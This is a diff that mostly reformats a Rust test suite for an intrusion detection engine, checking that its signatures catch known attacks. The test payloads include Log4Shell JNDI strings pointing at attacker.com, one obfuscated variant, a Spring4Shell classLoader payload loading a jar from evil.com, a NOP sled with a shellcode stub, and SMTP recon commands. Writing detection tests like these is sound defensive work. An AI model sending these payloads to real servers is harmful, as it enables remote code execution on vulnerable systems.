@@ -8,8 +8,8 @@
 //! - **SSTI** `{{7*7}}` must be caught
 //! - **VRFY/EXPN** recon commands must trigger alerts
 
-use std::net::{IpAddr, Ipv4Addr};
 use ids_engine::{IdsConfig, IdsEngine, IdsVerdict};
+use std::net::{IpAddr, Ipv4Addr};
 
 // ── Helpers ───────────────────────────────────────────────────────────────────
 
@@ -36,14 +36,17 @@ fn ips_engine() -> IdsEngine {
 #[test]
 fn test_nop_sled_actual_bytes_detected() {
     let engine = ids_engine();
-// Craft payload with real 0x90 bytes — the kind a shellcode would contain
+    // Craft payload with real 0x90 bytes — the kind a shellcode would contain
     let mut payload = b"DATA\r\n".to_vec();
     payload.extend_from_slice(&[0x90u8; 16]); // 16 NOP bytes
     payload.extend_from_slice(b"\x31\xc0\x50\x68"); // dummy shellcode stub
 
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", &payload);
     let nop_alerts: Vec<_> = alerts.iter().filter(|a| a.id == 2000002).collect();
-    assert!(!nop_alerts.is_empty(), "NOP sled (actual 0x90 bytes) must generate alert SID 2000002");
+    assert!(
+        !nop_alerts.is_empty(),
+        "NOP sled (actual 0x90 bytes) must generate alert SID 2000002"
+    );
 }
 
 /// ASCII text `\\x90\\x90` must NOT trigger the NOP sled signature.
@@ -51,7 +54,7 @@ fn test_nop_sled_actual_bytes_detected() {
 #[test]
 fn test_nop_sled_ascii_text_not_detected() {
     let engine = ids_engine();
-// This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
+    // This is the TEXT string "\\x90\\x90\\x90\\x90" — NOT actual 0x90 bytes
     let payload = b"DATA\r\n\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90";
 
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
@@ -85,13 +88,16 @@ fn test_log4shell_jndi_ldap() {
     let engine = ids_engine();
     let payload = b"GET /?name=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\n";
     let (verdict, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
-    assert!(!alerts.is_empty(), "Log4Shell ${{jndi:...}} must trigger an alert");
+    assert!(
+        !alerts.is_empty(),
+        "Log4Shell ${{jndi:...}} must trigger an alert"
+    );
     assert!(
         alerts.iter().any(|a| a.id == 2000012),
         "Expected SID 2000012 (Log4Shell) in alerts: {:?}",
         alerts.iter().map(|a| a.id).collect::<Vec<_>>()
     );
-// In IDS mode verdict should be Alert (not Drop since inline=false)
+    // In IDS mode verdict should be Alert (not Drop since inline=false)
     assert_eq!(verdict, IdsVerdict::Alert);
 }
 
@@ -101,7 +107,10 @@ fn test_log4shell_jndi_dns() {
     let engine = ids_engine();
     let payload = b"X-Api-Version: ${jndi:dns://burpcollaborator.net/x}\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 443, "http", payload);
-    assert!(!alerts.is_empty(), "Log4Shell via DNS jndi must be detected");
+    assert!(
+        !alerts.is_empty(),
+        "Log4Shell via DNS jndi must be detected"
+    );
 }
 
 /// Spring4Shell CVE-2022-22965:classLoader binding via HTTP parameters.
@@ -110,7 +119,10 @@ fn test_spring4shell_classloader() {
     let engine = ids_engine();
     let payload = b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nclass.module.classLoader.urls[0]=jar:http://evil.com/exploit.jar!/";
     let (_, alerts) = engine.inspect(src_ip(), 8080, "http", payload);
-    assert!(!alerts.is_empty(), "Spring4Shell class.module.classLoader must be detected");
+    assert!(
+        !alerts.is_empty(),
+        "Spring4Shell class.module.classLoader must be detected"
+    );
     assert!(
         alerts.iter().any(|a| a.id == 2000013),
         "Expected SID 2000013 (Spring4Shell)"
@@ -133,7 +145,10 @@ fn test_smtp_vrfy_recon() {
     let payload = b"VRFY postmaster\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
     assert!(!alerts.is_empty(), "VRFY recon must be alerted");
-    assert!(alerts.iter().any(|a| a.id == 2000003), "Expected SID 2000003");
+    assert!(
+        alerts.iter().any(|a| a.id == 2000003),
+        "Expected SID 2000003"
+    );
 }
 
 // ── IPS mode:inline Drop vs IDS mode:Alert downgrade ───────────────────────
@@ -142,7 +157,7 @@ fn test_smtp_vrfy_recon() {
 #[test]
 fn test_ips_mode_yields_drop() {
     let engine = ips_engine();
-// Payload that matches the NOP sled signature
+    // Payload that matches the NOP sled signature
     let mut payload = b"DATA\r\n".to_vec();
     payload.extend_from_slice(&[0x90u8; 16]);
 
@@ -180,7 +195,10 @@ fn test_clean_smtp_no_alerts() {
     let engine = ids_engine();
     let payload = b"MAIL FROM:<alice@example.com>\r\n";
     let (verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
-    assert!(alerts.is_empty(), "Clean SMTP MAIL FROM must not generate alerts");
+    assert!(
+        alerts.is_empty(),
+        "Clean SMTP MAIL FROM must not generate alerts"
+    );
     assert_eq!(verdict, IdsVerdict::Pass);
 }
 
@@ -225,8 +243,8 @@ fn test_log4shell_mixedcase_jndi_blocked() {
 #[test]
 fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
     let engine = ids_engine();
-// Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
-// SID 2000017 (pattern `jndi:ldap://`) fires here.
+    // Raw JNDI URL — no `${...}` prefix. SID 2000012 requires `${jndi:` so only
+    // SID 2000017 (pattern `jndi:ldap://`) fires here.
     let payload = b"GET /?redirect=jndi:ldap://attacker.com/exploit HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     assert!(
@@ -247,7 +265,7 @@ fn test_log4shell_raw_jndi_ldap_no_wrapper_detected() {
 #[test]
 fn test_log4shell_deeply_obfuscated_known_bypass() {
     let engine = ids_engine();
-// `${j${::-n}di:ldap://...}` — nested substitution obfuscation
+    // `${j${::-n}di:ldap://...}` — nested substitution obfuscation
     let payload = b"GET /?x=${j${::-n}di:ldap://attacker.com/x} HTTP/1.1\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 80, "http", payload);
     let fired_sids: Vec<u32> = alerts.iter().map(|a| a.id).collect();
@@ -263,7 +281,7 @@ fn test_log4shell_deeply_obfuscated_known_bypass() {
 #[test]
 fn test_log4shell_raw_jndi_iiop_detected() {
     let engine = ids_engine();
-// Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
+    // Plain JNDI IIOP URL — tests that SID 2000017 also covers non-ldap protocols.
     let payload = b"X-Forwarded-For: jndi:iiop://10.0.0.1:1099/malicious-object\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 443, "https", payload);
     assert!(
@@ -310,7 +328,7 @@ fn test_smtp_vrfy_mixedcase_detected() {
 #[test]
 fn test_smtp_auth_plain_lowercase_detected() {
     let engine = ids_engine();
-// base64 of "user:pass" – legitimate format but lowercase command should still match
+    // base64 of "user:pass" – legitimate format but lowercase command should still match
     let payload = b"auth plain dXNlcjpwYXNz\r\n";
     let (_, alerts) = engine.inspect(src_ip(), 587, "smtp", payload);
     assert!(
@@ -385,7 +403,8 @@ fn test_rcpt_to_no_false_positive() {
 #[test]
 fn test_rcpt_to_burst_detected() {
     let engine = ids_engine();
-    let payload = b"RCPT TO:<a@example.com>\r\nRCPT TO:<b@example.com>\r\nRCPT TO:<c@example.com>\r\n";
+    let payload =
+        b"RCPT TO:<a@example.com>\r\nRCPT TO:<b@example.com>\r\nRCPT TO:<c@example.com>\r\n";
     let (_verdict, alerts) = engine.inspect(src_ip(), 25, "smtp", payload);
     assert!(
         alerts.iter().any(|a| a.id == 3000007),
@@ -393,4 +412,3 @@ fn test_rcpt_to_burst_detected() {
         alerts.iter().map(|a| a.id).collect::<Vec<_>>()
     );
 }
-
